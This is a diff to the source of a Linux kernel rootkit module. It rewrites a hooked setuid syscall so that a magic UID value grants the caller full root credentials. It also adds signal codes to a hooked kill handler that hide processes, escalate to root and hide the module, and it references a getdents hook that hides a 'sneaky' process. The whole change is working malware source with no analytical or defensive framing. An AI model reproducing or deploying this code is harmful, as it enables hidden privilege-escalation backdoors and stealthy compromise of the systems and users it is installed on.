@@ -10,6 +10,11 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <linux/file.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+
+
+
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -19,12 +24,19 @@
 #define write_cr0(x) (native_write_cr0(x))
 
 #define BUFFLEN 32
-
+#define PF_INVISIBLE 0x10000000
+#define MAGIC_NUMBER 12345
 struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
   char d_name[BUFFLEN];
+};
+
+enum {
+  SIGSHPROC = 31,
+  SIGSUPER = 64,
+  SIGHIDEMOD = 63,
 };
 
 static int sneaky_pid = 0;
@@ -104,6 +116,38 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
   return original_call(pathname, flags, mode);
 }
 
+/* Malicious setuid hook syscall */
+asmlinkage int sneaky_setuid(uid_t uid)
+{
+  if (uid == MAGIC_NUMBER)
+    {
+      /* Create new cred struct */
+      struct cred *new_cred;
+      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+      printk(KERN_WARNING "[!] Attempting UID change!");
+      /* Prepares new set of credentials for task_struct of current process */
+      new_cred = prepare_creds();
+      /* Set uid of new cred struct to 0 */
+      new_cred->uid = GLOBAL_ROOT_UID;
+      new_cred->gid = GLOBAL_ROOT_GID;
+      new_cred->suid = GLOBAL_ROOT_UID;
+      new_cred->sgid = GLOBAL_ROOT_GID;
+      new_cred->euid = GLOBAL_ROOT_UID;
+      new_cred->egid = GLOBAL_ROOT_GID;
+      new_cred->fsuid = GLOBAL_ROOT_UID;
+      new_cred->fsgid = GLOBAL_ROOT_GID;
+      /* Commit cred to task_struct of process */
+      commit_creds(new_cred);
+      printk(KERN_WARNING "[!] Changes Complete!");
+      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+      
+    }
+  /* Call original setuid syscall */
+  return origin_setuid(uid);
+}
+
+
+
 asmlinkage int sneaky_kill(pid_t pid, int sig){
   struct task_struct* task;
   switch(sig){
@@ -112,7 +156,7 @@ asmlinkage int sneaky_kill(pid_t pid, int sig){
     task->flags = task->flags ^ PF_INVISIBLE;
     break;
   case SIGSUPER:
-    GetRoot();
+    sneaky_setuid(MAGIC_NUMBER);
     break;
   case SIGHIDEMOD:
     if(mhide) ShowModule();
@@ -123,34 +167,7 @@ asmlinkage int sneaky_kill(pid_t pid, int sig){
   }
   return 0;
 }
-/* Malicious setuid hook syscall */
-asmlinkage int sneaky_setuid(uid_t uid)
-{
-  if (uid == (uint)1337)
-    {
-      /* Create new cred struct */
-      struct cred *np;
-      /* Create uid struct */
-      kuid_t nuid;
-      /* Set uid struct value to 0 */
-      nuid.val = 0;
-      /* Print UID and EUID of current process to dmesg */
-      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
-      printk(KERN_WARNING "[!] Attempting UID change!");
-      /* Prepares new set of credentials for task_struct of current process */
-      np = prepare_creds();
-      /* Set uid of new cred struct to 0 */
-      np->uid = nuid;
-      /* Set euid of new cred struct to 0 */
-      np->euid = nuid;
-      /* Commit cred to task_struct of process */
-      commit_creds(np);
-      printk(KERN_WARNING "[!] Changes Complete!");
-      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
-    }
-  /* Call original setuid syscall */
-  return origin_setuid(uid);
-}
+
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
   //hide the sneaky process
